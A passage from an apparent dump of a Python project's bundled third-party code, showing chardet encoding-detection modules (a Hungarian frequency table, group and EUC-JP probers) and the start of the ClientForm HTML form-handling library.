,\n2,1,1,1,1,2,1,2,1,1,1,2,2,1,1,2,1,1,1,2,1,1,1,1,1,1,1,1,1,1,0,1,\n1,2,3,0,0,0,1,0,3,2,1,0,0,1,2,1,1,0,0,0,0,2,1,0,1,1,0,0,2,1,2,1,\n1,1,0,0,0,1,0,1,1,1,1,1,2,0,0,1,0,0,0,2,0,0,1,1,1,1,1,1,1,1,0,1,\n3,0,0,2,1,2,2,1,0,0,2,1,2,2,0,0,0,2,1,1,1,0,1,1,0,0,1,1,2,0,0,0,\n1,2,1,2,2,1,1,2,1,2,0,1,1,1,1,1,1,1,1,1,2,1,1,0,0,1,1,1,1,0,0,1,\n1,3,2,0,0,0,1,0,2,2,2,0,0,0,2,2,1,0,0,0,0,3,1,1,1,1,0,0,2,1,1,1,\n2,1,0,1,1,1,0,1,1,1,1,1,1,1,0,2,1,0,0,1,0,1,1,0,1,1,1,1,1,1,0,1,\n2,3,2,0,0,0,1,0,2,2,0,0,0,0,2,1,1,0,0,0,0,2,1,0,1,1,0,0,2,1,1,0,\n2,1,1,1,1,2,1,2,1,2,0,1,1,1,0,2,1,1,1,2,1,1,1,1,0,1,1,1,1,1,0,1,\n3,1,1,2,2,2,3,2,1,1,2,2,1,1,0,1,0,2,2,1,1,1,1,1,0,0,1,1,0,1,1,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n2,2,2,0,0,0,0,0,2,2,0,0,0,0,2,2,1,0,0,0,1,1,0,0,1,2,0,0,2,1,1,1,\n2,2,1,1,1,2,1,2,1,1,0,1,1,1,1,2,1,1,1,2,1,1,1,1,0,1,2,1,1,1,0,1,\n1,0,0,1,2,3,2,1,0,0,2,0,1,1,0,0,0,1,1,1,1,0,1,1,0,0,1,0,0,0,0,0,\n1,2,1,2,1,2,1,1,1,2,0,2,1,1,1,0,1,2,0,0,1,1,1,0,0,0,0,0,0,0,0,0,\n2,3,2,0,0,0,0,0,1,1,2,1,0,0,1,1,1,0,0,0,0,2,0,0,1,1,0,0,2,1,1,1,\n2,1,1,1,1,1,1,2,1,0,1,1,1,1,0,2,1,1,1,1,1,1,0,1,0,1,1,1,1,1,0,1,\n1,2,2,0,1,1,1,0,2,2,2,0,0,0,3,2,1,0,0,0,1,1,0,0,1,1,0,1,1,1,0,0,\n1,1,0,1,1,1,1,1,1,1,1,2,1,1,1,1,1,1,1,2,1,1,1,0,0,1,1,1,0,1,0,1,\n2,1,0,2,1,1,2,2,1,1,2,1,1,1,0,0,0,1,1,0,1,1,1,1,0,0,1,1,1,0,0,0,\n1,2,2,2,2,2,1,1,1,2,0,2,1,1,1,1,1,1,1,1,1,1,1,1,0,1,1,0,0,0,1,0,\n1,2,3,0,0,0,1,0,2,2,0,0,0,0,2,2,0,0,0,0,0,1,0,0,1,0,0,0,2,0,1,0,\n2,1,1,1,1,1,0,2,0,0,0,1,2,1,1,1,1,0,1,2,0,1,0,1,0,1,1,1,0,1,0,1,\n2,2,2,0,0,0,1,0,2,1,2,0,0,0,1,1,2,0,0,0,0,1,0,0,1,1,0,0,2,1,0,1,\n2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,2,0,1,1,1,1,1,0,1,\n1,2,2,0,0,0,1,0,2,2,2,0,0,0,1,1,0,0,0,0,0,1,1,0,2,0,0,1,1,1,0,1,\n1,0,1,1,1,1,1,1,0,1,1,1,1,0,0,1,0,0,1,1,0,1,0,1,1,1,1,1,0,0,0,1,\n1,0,0,1,0,1,2,1,0,0,1,1,1,2,0,0,0,1,1,0,1,0,1,1,0,0,1,0,0,0,0,0,\n0,2,1,2,1,1,1,1,1,2,0,2,0,1,1,0,1,2,1,0,1,1,1,0,0,0,0,0,0,1,0,0,\n2,1,1,0,1,2,0,0,1,1,1,0,0,0,1,1,0,0,0,0,0,1,0,0,1,0,0,0,2,1,0,1,\n2,2,1,1,1,1,1,2,1,1,0,1,1,1,1,2,1,1,1,2,1,1,0,1,0,1,1,1,1,1,0,1,\n1,2,2,0,0,0,0,0,1,1,0,0,0,0,2,1,0,0,0,0,0,2,0,0,2,2,0,0,2,0,0,1,\n2,1,1,1,1,1,1,1,0,1,1,0,1,1,0,1,0,0,0,1,1,1,1,0,0,1,1,1,1,0,0,1,\n1,1,2,0,0,3,1,0,2,1,1,1,0,0,1,1,1,0,0,0,1,1,0,0,0,1,0,0,1,0,1,0,\n1,2,1,0,1,1,1,2,1,1,0,1,1,1,1,1,0,0,0,1,1,1,1,1,0,1,0,0,0,1,0,0,\n2,1,1,0,0,0,0,0,1,0,0,0,0,0,0,0,0,1,0,1,0,0,0,1,0,0,0,0,2,0,0,0,\n2,1,1,1,1,1,1,1,1,1,0,1,1,1,1,1,1,1,1,1,2,1,1,0,0,1,1,1,1,1,0,1,\n2,1,1,1,2,1,1,1,0,1,1,2,1,0,0,0,0,1,1,1,1,0,1,0,0,0,0,1,0,0,0,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,1,0,1,1,1,1,1,0,0,1,1,2,1,0,0,0,1,1,0,0,0,1,1,0,0,1,0,1,0,0,0,\n1,2,1,1,1,1,1,1,1,1,0,1,0,1,1,1,1,1,1,0,1,1,1,0,0,0,0,0,0,1,0,0,\n2,0,0,0,1,1,1,1,0,0,1,1,0,0,0,0,0,1,1,1,2,0,0,1,0,0,1,0,1,0,0,0,\n0,1,1,1,1,1,1,1,1,2,0,1,1,1,1,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,\n1,0,0,1,1,1,1,1,0,0,2,1,0,1,0,0,0,1,0,1,0,0,0,0,0,0,1,0,0,0,0,0,\n0,1,1,1,1,1,1,0,1,1,0,1,0,1,1,0,1,1,0,0,1,1,1,0,0,0,0,0,0,0,0,0,\n1,0,0,1,1,1,0,0,0,0,1,0,2,0,0,0,0,0,0,0,0,0,2,0,0,0,0,0,0,0,0,0,\n0,1,1,1,1,1,0,0,1,1,0,1,0,1,0,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,\n0,0,0,1,0,0,0,0,0,0,1,1,2,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n0,1,1,1,0,1,0,0,1,1,0,1,0,1,1,0,1,1,1,0,1,1,1,0,0,0,0,0,0,0,0,0,\n2,1,1,1,1,1,1,1,1,1,1,0,0,1,1,1,0,0,1,0,0,1,0,1,0,1,1,1,0,0,1,0,\n0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,\n1,0,0,1,1,1,1,0,0,0,1,1,1,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,\n0,1,1,1,1,1,1,0,1,1,0,1,0,1,0,0,1,1,0,0,1,1,0,0,0,0,0,0,0,0,0,0,\n)\n\nLatin2HungarianModel = {\n  'char_to_order_map': Latin2_HungarianCharToOrderMap,\n  'precedence_matrix': HungarianLangModel,\n  'typical_positive_ratio': 0.947368,\n  'keep_english_letter': True,\n  'charset_name': \"ISO-8859-2\",\n  'language': 'Hungarian',\n}\n\nWin1250HungarianModel = {\n  'char_to_order_map': win1250HungarianCharToOrderMap,\n  'precedence_matrix': HungarianLangModel,\n  'typical_positive_ratio': 0.947368,\n  'keep_english_letter': True,\n  'charset_name': \"windows-1250\",\n  'language': 'Hungarian',\n}\n", "thirdparty/chardet/charsetgroupprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .enums import ProbingState\nfrom .charsetprober import CharSetProber\n\n\nclass CharSetGroupProber(CharSetProber):\n    def __init__(self, lang_filter=None):\n        super(CharSetGroupProber, self).__init__(lang_filter=lang_filter)\n        self._active_num = 0\n        self.probers = []\n        self._best_guess_prober = None\n\n    def reset(self):\n        super(CharSetGroupProber, self).reset()\n        self._active_num = 0\n        for prober in self.probers:\n            if prober:\n                prober.reset()\n                prober.active = True\n                self._active_num += 1\n        self._best_guess_prober = None\n\n    @property\n    def charset_name(self):\n        if not self._best_guess_prober:\n            self.get_confidence()\n            if not self._best_guess_prober:\n                return None\n        return self._best_guess_prober.charset_name\n\n    @property\n    def language(self):\n        if not self._best_guess_prober:\n            self.get_confidence()\n            if not self._best_guess_prober:\n                return None\n        return self._best_guess_prober.language\n\n    def feed(self, byte_str):\n        for prober in self.probers:\n            if not prober:\n                continue\n            if not prober.active:\n                continue\n            state = prober.feed(byte_str)\n            if not state:\n                continue\n            if state == ProbingState.FOUND_IT:\n                self._best_guess_prober = prober\n                return self.state\n            elif state == ProbingState.NOT_ME:\n                prober.active = False\n                self._active_num -= 1\n                if self._active_num <= 0:\n                    self._state = ProbingState.NOT_ME\n                    return self.state\n        return self.state\n\n    def get_confidence(self):\n        state = self.state\n        if state == ProbingState.FOUND_IT:\n            return 0.99\n        elif state == ProbingState.NOT_ME:\n            return 0.01\n        best_conf = 0.0\n        self._best_guess_prober = None\n        for prober in self.probers:\n            if not prober:\n                continue\n            if not prober.active:\n                self.logger.debug('%s not active', prober.charset_name)\n                continue\n            conf = prober.get_confidence()\n            self.logger.debug('%s %s confidence = %s', prober.charset_name, prober.language, conf)\n            if best_conf < conf:\n                best_conf = conf\n                self._best_guess_prober = prober\n        if not self._best_guess_prober:\n            return 0.0\n        return best_conf\n", "thirdparty/chardet/eucjpprober.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is mozilla.org code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\nfrom .enums import ProbingState, MachineState\nfrom .mbcharsetprober import MultiByteCharSetProber\nfrom .codingstatemachine import CodingStateMachine\nfrom .chardistribution import EUCJPDistributionAnalysis\nfrom .jpcntx import EUCJPContextAnalysis\nfrom .mbcssm import EUCJP_SM_MODEL\n\n\nclass EUCJPProber(MultiByteCharSetProber):\n    def __init__(self):\n        super(EUCJPProber, self).__init__()\n        self.coding_sm = CodingStateMachine(EUCJP_SM_MODEL)\n        self.distribution_analyzer = EUCJPDistributionAnalysis()\n        self.context_analyzer = EUCJPContextAnalysis()\n        self.reset()\n\n    def reset(self):\n        super(EUCJPProber, self).reset()\n        self.context_analyzer.reset()\n\n    @property\n    def charset_name(self):\n        return \"EUC-JP\"\n\n    @property\n    def language(self):\n        return \"Japanese\"\n\n    def feed(self, byte_str):\n        for i in range(len(byte_str)):\n            # PY3K: byte_str is a byte array, so byte_str[i] is an int, not a byte\n            coding_state = self.coding_sm.next_state(byte_str[i])\n            if coding_state == MachineState.ERROR:\n                self.logger.debug('%s %s prober hit error at byte %s',\n                                  self.charset_name, self.language, i)\n                self._state = ProbingState.NOT_ME\n                break\n            elif coding_state == MachineState.ITS_ME:\n                self._state = ProbingState.FOUND_IT\n                break\n            elif coding_state == MachineState.START:\n                char_len = self.coding_sm.get_current_charlen()\n                if i == 0:\n                    self._last_char[1] = byte_str[0]\n                    self.context_analyzer.feed(self._last_char, char_len)\n                    self.distribution_analyzer.feed(self._last_char, char_len)\n                else:\n                    self.context_analyzer.feed(byte_str[i - 1:i + 1],\n                                                char_len)\n                    self.distribution_analyzer.feed(byte_str[i - 1:i + 1],\n                                                     char_len)\n\n        self._last_char[0] = byte_str[-1]\n\n        if self.state == ProbingState.DETECTING:\n            if (self.context_analyzer.got_enough_data() and\n               (self.get_confidence() > self.SHORTCUT_THRESHOLD)):\n                self._state = ProbingState.FOUND_IT\n\n        return self.state\n\n    def get_confidence(self):\n        context_conf = self.context_analyzer.get_confidence()\n        distrib_conf = self.distribution_analyzer.get_confidence()\n        return max(context_conf, distrib_conf)\n", "thirdparty/clientform/clientform.py": "\"\"\"HTML form handling for web clients.\n\nClientForm is a Python module for handling HTML forms on the client\nside, useful for parsing HTML forms, filling them in and returning the\ncompleted forms to the server.  It has developed from a port of Gisle\nAas' Perl module HTML::Form, from the libwww-perl library, but the\ninterface is not the same.\n\nThe most useful docstring is the one for HTMLForm.\n\nRFC 1866: HTML 2.0\nRFC 1867: Form-based File Upload in HTML\nRFC 2388: Returning Values from Forms: multipart/form-data\nHTML 3.2 Specification, W3C Recommendation 14 January 1997 (for ISINDEX)\nHTML 4.01 Specification, W3C Recommendation 24 December 1999\n\n\nCopyright 2002-2007 John J. Lee <jjl@pobox.com>\nCopyright 2005 Gary Poster\nCopyright 2005 Zope Corporation\nCopyright 1998-2000 Gisle Aas.\n\nThis code is free software; you can redistribute it and/or modify it\nunder the terms of the BSD or ZPL 2.1 licenses (see the file\nCOPYING.txt included with the distribution).\n\n\"\"\"\n\n# XXX\n# Remove parser testing hack\n# safeUrl()-ize action\n# Switch to unicode throughout (would be 0.3.x)\n#  See Wichert Akkerman's 2004-01-22 message to c.l.py.\n# Add charset parameter to Content-type headers?  How to find value??\n# Add some more functional tests\n#  Especially single and multiple file upload on the internet.\n#  Does file upload work when name is missing?  Sourceforge tracker form\n#   doesn't like it.  Check standards, and test with Apache.  Test\n#   binary upload with Apache.\n# mailto submission & enctype text/plain\n# I'm not going to fix this unless somebody tells me what real servers\n#  that want this encoding actually expect: If enctype is\n#  application/x-www-form-urlencoded and there's a FILE control present.\n#  Strictly, it should be 'name=data' (see HTML 4.01 spec., section\n#  17.13.2), but I send \"name=\" ATM.  What about multiple file upload??\n\n# Would be nice, but I'm not going to do it myself:\n# -------------------------------------------------\n# Maybe a 0.4.x?\n#   Replace by_label etc. with moniker / selector concept. Allows, eg.,\n#    a choice between selection by value / id / label / element\n#    contents.  Or choice between matching labels exactly or by\n#    substring.  Etc.\n#   Remove deprecated methods.\n#   ...what else?\n# Work on DOMForm.\n# XForms?  Don't know if there's a need here.\n\n__all__ = ['AmbiguityError', 'CheckboxControl', 'Control',\n           'ControlNotFoundError', 'FileControl', 'FormParser', 'HTMLForm',\n           'HiddenControl', 'IgnoreControl', 'ImageControl', 'IsindexControl',\n           'Item', 'ItemCountError', 'ItemNotFoundError', 'Label',\n           'ListControl', 'LocateError', 'Missing', 'ParseError', 'ParseFile',\n           'ParseFileEx', 'ParseResponse', 'ParseResponseEx','PasswordControl',\n           'RadioControl', 'ScalarControl', 'SelectControl',\n           'SubmitButtonControl', 'SubmitControl', 'TextControl',\n           'TextareaControl', 'XHTMLCompatibleFormParser']\n\ntry:\n    import logging\n    import inspect\nexcept ImportError:\n    def debug(msg, *args, **kwds):\n        pass\nelse:\n    _logger = logging.getLogger(\"ClientForm\")\n    OPTIMIZATION_HACK = True\n\n    def debug(msg, *args, **kwds):\n        if OPTIMIZATION_HACK:\n            return\n\n        caller_name = inspect.stack()[1][3]\n        extended_msg = '%%s %s' % msg\n        extended_args = (caller_name,)+args\n        debug = _logger.debug(extended_msg, *extended_args, **kwds)\n\n    def _show_debug_messages():\n        global OPTIMIZATION_HACK\n        OPTIMIZATION_HACK = False\n        _logger.setLevel(logging.DEBUG)\n        handler = logging.StreamHandler(sys.stdout)\n        handler.setLevel(logging.DEBUG)\n        _logger.addHandler(handler)\n\ntry:\n    from thirdparty import six\n    from thirdparty.six import unichr as _unichr\n    from thirdparty.six.moves import cStringIO as _cStringIO\n    from thirdparty.six.moves import html_entities as _html_entities\n    from thirdparty.six.moves import urllib as _urllib\nexcept ImportError:\n    import six\n    from six import unichr as _unichr\n    from six.moves import cStringIO as _cStringIO\n    from six.moves import html_entities as _html_entities\n    from six.moves import urllib as _urllib\n\ntry:\n    import sgmllib\nexcept ImportError:\n    from lib.utils import sgmllib\n\nimport sys, re, random\n\nif sys.version_info >= (3, 0):\n    xrange = range\n\n# monkeypatch to fix http://www.python.org/sf/803422 :-(\nsgmllib.charref = re.compile(\"&#(x?[0-9a-fA-F]+)[^0-9a-fA-F]\")\n\n# HTMLParser.HTMLParser is recent, so live without it if it's not available\n# (also, sgmllib.SGMLParser is much more tolerant of bad HTML)\ntry:\n    import HTMLParser\nexcept ImportError:\n    HAVE_MODULE_HTMLPARSER = False\nelse:\n    HAVE_MODULE_HTMLPARSER = True\n\ntry:\n    import warnings\nexcept ImportError:\n    def deprecation(message, stack_offset=0):\n        pass\nelse:\n    def deprecation(message, stack_offset=0):\n        warnings.warn(message, DeprecationWarning, stacklevel=3+stack_offset)\n\nVERSION = \"0.2.10\"\n\nCHUNK = 1024  # size of chunks fed to parser, in bytes\n\nDEFAULT_ENCODING = \"latin-1\"\n\nclass Missing: pass\n\n_compress_re = re.compile(r\"\\s+\")\ndef compress_text(text): return _compress_re.sub(\" \", text.strip())\n\ndef normalize_line_endings(text):\n    return re.sub(r\"(?:(?<!\\r)\\n)|(?:\\r(?!\\n))\", \"\\r\\n\", text)\n\ndef _quote_plus(value):\n    if not isinstance(value, six.string_types):\n        value = six.text_type(value)\n\n    if isinstance(value, six.text_type):\n        value = value.encode(\"utf8\")\n\n    return _urllib.parse.quote_plus(value)\n\n# This version of urlencode is from my Python 1.5.2 back-port of the\n# Python 2.1 CVS maintenance branch of urllib.  It will accept a sequence\n# of pairs instead of a mapping -- the 2.0 version only accepts a mapping.\ndef urlencode(query,doseq=False,):\n    \"\"\"Encode a sequence of two-element tuples or dictionary into a URL query \\\nstring.\n\n    If any values in the query arg are sequences and doseq is true, each\n    sequence element is converted to a separate parameter.\n\n    If the query arg is a sequence of two-element tuples, the order of the\n    parameters in the output will match the order of parameters in the\n    input.\n    \"\"\"\n\n    if hasattr(query,\"items\"):\n        # mapping objects\n        query = query.items()\n    else:\n        # it's a bother at times that strings and string-like objects are\n        # sequences...\n        try:\n            # non-sequence items should not work with len()\n            x = len(query)\n            # non-empty strings will fail this\n            if len(query) and type(query[0]) != tuple:\n                raise TypeError()\n            # zero-length sequences of all types will get here and succeed,\n            # but that's a minor nit - since the original implementation\n            # allowed empty dicts that type of behavior probably should be\n            # preserved for consistency\n        except TypeError:\n            ty,va,tb = sys.exc_info()\n            raise TypeError(\"not a valid non-string sequence or mapping \"\n                            \"object\", tb)\n\n    l = []\n    if not doseq:\n        # preserve old behavior\n        for k, v in query:\n            k = _quote_plus(k)\n            v = _quote_plus(v)\n            l.append(k + '=' + v)\n    else:\n        for k, v in query:\n            k = _quote_plus(k)\n            if isinstance(v, six.string_types):\n                v = _quote_plus(v)\n                l.append(k + '=' + v)\n            else:\n                try:\n                    # is this a sufficient test for sequence-ness?\n                    x = len(v)\n                except TypeError:\n                    # not a sequence\n                    v = _quote_plus(v)\n                    l.append(k + '=' + v)\n                else:\n                    # loop over the sequence\n                    for elt in v:\n                        l.append(k + '=' + _quote_plus(elt))\n    return '&'.join(l)\n\ndef unescape(data, entities, encoding=DEFAULT_ENCODING):\n    if data is None or \"&\" not in data:\n        return data\n\n    if isinstance(data, six.string_types):\n        encoding = None\n\n    def replace_entities(match, entities=entities, encoding=encoding):\n        ent = match.group()\n        if ent[1] == \"#\":\n            return unescape_charref(ent[2:-1], encoding)\n\n        repl = entities.get(ent)\n        if repl is not None:\n            if hasattr(repl, \"decode\") and encoding is not None:\n                try:\n                    repl = repl.decode(encoding)\n                except UnicodeError:\n                    repl = ent\n        else:\n            repl = ent\n\n        return repl\n\n    return re.sub(r\"&#?[A-Za-z0-9]+?;\", replace_entities, data)\n\ndef unescape_charref(data, encoding):\n    name, base = data, 10\n    if name.startswith(\"x\"):\n        name, base= name[1:], 16\n    elif not name.isdigit():\n        base = 16\n\n    try:\n        return _unichr(int(name, base))\n    except:\n        return data\n\ndef get_entitydefs():\n    from codecs import latin_1_decode\n    entitydefs = {}\n    try:\n        _html_entities.name2codepoint\n    except AttributeError:\n        entitydefs = {}\n        for name, char in _html_entities.entitydefs.items():\n            uc = latin_1_decode(char)[0]\n            if uc.startswith(\"&#\") and uc.endswith(\";\"):\n                uc = unescape_charref(uc[2:-1], None)\n            entitydefs[\"&%s;\" % name] = uc\n    else:\n        for name, codepoint in _html_entities.name2codepoint.items():\n            entitydefs[\"&%s;\" % name] = _unichr(codepoint)\n    return entitydefs\n\ndef issequence(x):\n    try:\n        x[0]\n    except (TypeError, KeyError):\n        return False\n    except IndexError:\n        pass\n    return True\n\ndef isstringlike(x):\n    try: x+\"\"\n    except: return False\n    else: return True\n\n\ndef choose_boundary():\n    \"\"\"Return a string usable as a multipart boundary.\"\"\"\n    # follow IE and firefox\n    nonce = \"\".join([str(random.randint(0, sys.maxsize-1)) for i in (0,1,2)])\n    return \"-\"*27 + nonce\n\n# This cut-n-pasted MimeWriter from standard library is here so can add\n# to HTTP headers rather than message body when appropriate.  It also uses\n# \\r\\n in place of \\n.  This is a bit nasty.\nclass MimeWriter:\n\n    \"\"\"Generic MIME writer.\n\n    Methods:\n\n    __init__()\n    addheader()\n    flushheaders()\n    startbody()\n    startmultipartbody()\n    nextpart()\n    lastpart()\n\n    A MIME writer is much more primitive than a MIME parser.  It\n    doesn't seek around on the output file, and it doesn't use large\n    amounts of buffer space, so you have to write the parts in the\n    order they should occur on the output file.  It does buffer the\n    headers you add, allowing you to rearrange their order.\n\n    General usage is:\n\n    f = <open the output file>\n    w = MimeWriter(f)\n    ...call w.addheader(key, value) 0 or more times...\n\n    followed by either:\n\n    f = w.startbody(content_type)\n    ...call f.write(data) for body data...\n\n    or:\n\n    w.startmultipartbody(subtype)\n    for each part:\n        subwriter = w.nextpart()\n        ...use the subwriter's methods to create the subpart...\n    w.lastpart()\n\n    The subwriter is another MimeWriter instance, and should be\n    treated in the same way as the toplevel MimeWriter.  This way,\n    writing recursive body parts is easy.\n\n    Warning: don't forget to call lastpart()!\n\n    XXX There should be more state so calls made in the wrong order\n    are detected.\n\n    Some special cases:\n\n    - startbody() just returns the file passed to the constructor;\n      but don't use this knowledge, as it may be changed.\n\n    - startmultipartbody() actually returns a file as well;\n      this can be used to write the initial 'if you can read this your\n      mailer is not MIME-aware' message.\n\n    - If you call flushheaders(), the headers accumulated so far are\n      written out (and forgotten); this is useful if you don't need a\n      body part at all, e.g. for a subpart of type message/rfc822\n      that's (mis)used to store some header-like information.\n\n    - Passing a keyword argument 'prefix=<flag>' to addheader(),\n      start*body() affects where the header is inserted; 0 means\n      append at the end, 1 means insert at the start; default is\n      append for addheader(), but insert for start*body(), which use\n      it to determine where the Content-type header goes.\n\n    \"\"\"\n\n    def __init__(self, fp, http_hdrs=None):\n        self._http_hdrs = http_hdrs\n        self._fp = fp\n        self._headers = []\n        self._boundary = []\n        self._first_part = True\n\n    def addheader(self, key, value, prefix=0,\n                  add_to_http_hdrs=0):\n        \"\"\"\n        prefix is ignored if add_to_http_hdrs is true.\n        \"\"\"\n        lines = value.split(\"\\r\\n\")\n        while lines and not lines[-1]: del lines[-1]\n        while lines and not lines[0]: del lines[0]\n        if add_to_http_hdrs:\n            value = \"\".join(lines)\n            # 2.2 urllib2 doesn't normalize header case\n            self._http_hdrs.append((key.capitalize(), value))\n        else:\n            for i in xrange(1, len(lines)):\n                lines[i] = \"    \" + lines[i].strip()\n            value = \"\\r\\n\".join(lines) + \"\\r\\n\"\n            line = key.title() + \": \" + value\n            if prefix:\n                self._headers.insert(0, line)\n            else:\n                self._headers.append(line)\n\n    def flushheaders(self):\n        self._fp.writelines(self._headers)\n        self._headers = []\n\n    def startbody(self, ctype=None, plist=[], prefix=1,\n                  add_to_http_hdrs=0, content_type=1):\n        \"\"\"\n        prefix is ignored if add_to_http_hdrs is true.\n        \"\"\"\n        if content_type and ctype:\n            for name, value in plist:\n                ctype = ctype + ';\\r\\n %s=%s' % (name, value)\n            self.addheader(\"Content-Type\", ctype, prefix=prefix,\n                           add_to_http_hdrs=add_to_http_hdrs)\n        self.flushheaders()\n        if not add_to_http_hdrs: self._fp.write(\"\\r\\n\")\n        self._first_part = True\n        return self._fp\n\n    def startmultipartbody(self, subtype, boundary=None, plist=[], prefix=1,\n                           add_to_http_hdrs=0, content_type=1):\n        boundary = boundary or choose_boundary()\n        self._boundary.append(boundary)\n        return self.startbody(\"multipart/\" + subtype,\n                              [(\"boundary\", boundary)] + plist,\n                              prefix=prefix,\n                              add_to_http_hdrs=add_to_http_hdrs,\n                              content_type=content_type)\n\n    def nextpart(self):\n        boundary = self._boundary[-1]\n        if self._first_part:\n            self._first_part = False\n        else:\n            self._fp.write(\"\\r\\n\")\n        self._fp.write(\"--\" + boundary + \"\\r\\n\")\n        return self.__class__(self._fp)\n\n    def lastpart(self):\n        if self._first_part:\n            self.nextpart()\n        boundary = self._boundary.pop()\n        self._fp.write(\"\\r\\n--\" + boundary + \"--\\r\\n\")\n\n\nclass LocateError(ValueError): pass\nclass AmbiguityError(LocateError): pass\nclass ControlNotFoundError(LocateError): pass\nclass ItemNotFoundError(LocateError): pass\n\nclass ItemCountError(ValueError): pass\n\n# for backwards compatibility, ParseError derives from exceptions that were\n# raised by versions of ClientForm <= 0.2.5\nif HAVE_MODULE_HTMLPARSER:\n    SGMLLIB_PARSEERROR = sgmllib.SGMLParseError\n    class ParseError(sgmllib.SGMLParseError,\n                     HTMLParser.HTMLParseError,\n                     ):\n        pass\nelse:\n    if hasattr(sgmllib, \"SGMLParseError\"):\n        SGMLLIB_PARSEERROR = sgmllib.SGMLParseError\n        class ParseError(sgmllib.SGMLParseError):\n            pass\n    else:\n        SGMLLIB_PARSEERROR = RuntimeError\n        class ParseError(RuntimeError):\n            pass\n\n\nclass _AbstractFormParser:\n    \"\"\"forms attribute contains HTMLForm instances on completion.\"\"\"\n    # thanks to Moshe Zadka for an example of sgmllib/htmllib usage\n    def __init__(self, entitydefs=None, encoding=DEFAULT_ENCODING):\n        if entitydefs is None:\n            entitydefs = get_entitydefs()\n        self._entitydefs = entitydefs\n        self._encoding = encoding\n\n        self.base = None\n        self.forms = []\n        self.labels = []\n        self._current_label = None\n        self._current_form = None\n        self._select = None\n        self._optgroup = None\n        self._option = None\n        self._textarea = None\n\n        # forms[0] will contain all controls that are outside of any form\n        # self._global_form is an alias for self.forms[0]\n        self._global_form = None\n        self.start_form([])\n        self.end_form()\n        self._current_form = self._global_form = self.forms[0]\n\n    def do_base(self, attrs):\n        debug(\"%s\", attrs)\n        for key, value in attrs:\n            if key == \"href\":\n                self.base = self.unescape_attr_if_required(value)\n\n    def end_body(self):\n        debug(\"\")\n        if self._current_label is not None:\n            self.end_label()\n        if self._current_form is not self._global_form:\n            self.end_form()\n\n    def start_form(self, attrs):\n        debug(\"%s\", attrs)\n        if self._current_form is not self._global_form:\n            raise ParseError(\"nested FORMs\")\n        name = None\n        action = None\n        enctype = \"application/x-www-form-urlencoded\"\n        method = \"GET\"\n        d = {}\n        for key, value in attrs:\n            if key == \"name\":\n                name = self.unescape_attr_if_required(value)\n            elif key == \"action\":\n                action = self.unescape_attr_if_required(value)\n            elif key == \"method\":\n                method = self.unescape_attr_if_required(value.upper())\n            elif key == \"enctype\":\n                enctype = self.unescape_attr_if_required(value.lower())\n            d[key] = self.unescape_attr_if_required(value)\n        controls = []\n        self._current_form = (name, action, method, enctype), d, controls\n\n    def end_form(self):\n        debug(\"\")\n        if self._current_label is not None:\n            self.end_label()\n        if self._current_form is self._global_form:\n            raise ParseError(\"end of FORM before start\")\n        self.forms.append(self._current_form)\n        self._current_form = self._global_form\n\n    def start_select(self, attrs):\n        debug(\"%s\", attrs)\n        if self._select is not None:\n            raise ParseError(\"nested SELECTs\")\n        if self._textarea is not None:\n            raise ParseError(\"SELECT inside TEXTAREA\")\n        d = {}\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n\n        self._select = d\n        self._add_label(d)\n\n        self._append_select_control({\"__select\": d})\n\n    def end_select(self):\n        debug(\"\")\n        if self._select is None:\n            raise ParseError(\"end of SELECT before start\")\n\n        if self._option is not None:\n            self._end_option()\n\n        self._select = None\n\n    def start_optgroup(self, attrs):\n        debug(\"%s\", attrs)\n        if self._select is None:\n            raise ParseError(\"OPTGROUP outside of SELECT\")\n        d = {}\n        for key, val in attrs:\n            d[key] = self.unescape_attr_if_required(val)\n\n        self._optgroup = d\n\n    def end_optgroup(self):\n        debug(\"\")\n        if self._optgroup is None:\n            raise ParseError(\"end of OPTGROUP before start\")\n        self._optgroup = None\n\n    def _start_option(self, attrs):\n        debug(\"%s\", attrs)\n        if self._select is None:\n            raise ParseError(\"OPTION outside of 